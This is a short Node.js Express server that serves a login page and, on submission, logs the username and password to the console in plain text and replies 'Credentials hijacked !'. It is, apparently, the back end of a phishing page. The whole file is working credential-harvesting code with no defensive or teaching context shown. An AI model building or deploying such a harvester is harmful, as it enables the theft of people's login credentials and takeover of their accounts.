const express = require("express")
const bodyParser = require("body-parser")
const path = require('path')


let app = express(); 
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true })); 


app.get("/login", function (req, res) { 
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
}); 

app.post('/login', (req, res) => {
    console.log("Username: " + req.body.username)
    console.log("Password: " + req.body.password)
    res.send("Credentials hijacked !");
});

var port = process.env.PORT || 3005; 
app.listen(port, function () { 
    console.log("Listening on port " + port); 
}); 